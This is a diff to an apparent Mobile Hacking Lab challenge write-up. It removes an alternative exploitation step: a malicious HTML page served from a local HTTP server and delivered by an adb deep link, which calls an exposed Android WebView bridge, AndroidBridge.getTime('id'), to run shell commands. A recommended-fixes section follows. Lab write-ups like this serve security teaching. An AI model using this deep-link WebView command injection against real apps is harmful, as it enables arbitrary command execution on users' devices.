@@ -138,34 +138,6 @@ uid=10211(u0_a211) gid=10211(u0_a211) groups=10211(u0_a211),3003(inet),...
 
 ---
 
-### Step 4 — Alternative: Hosted HTML Page (No Encoding Needed)
-
-Create a malicious HTML file with a path ending in `mobilehackinglab.com`:
-
-```bash
-cat > mobilehackinglab.com << 'EOF'
-<html>
-<body>
-<pre id="out">Loading...</pre>
-<script>
-  document.getElementById('out').innerText = AndroidBridge.getTime('id');
-</script>
-</body>
-</html>
-EOF
-
-python3 -m http.server 9090
-```
-
-Send the deep link:
-
-```bash
-adb shell am start -a android.intent.action.VIEW \
-  -d "mhl://mobilehackinglab?url=http://192.168.80.139:9090/mobilehackinglab.com"
-```
-
-The WebView loads the attacker-controlled page. The JavaScript calls `AndroidBridge.getTime('id')` and renders the command output directly in the WebView.
-
 ---
 
 ## Recommended Fixes
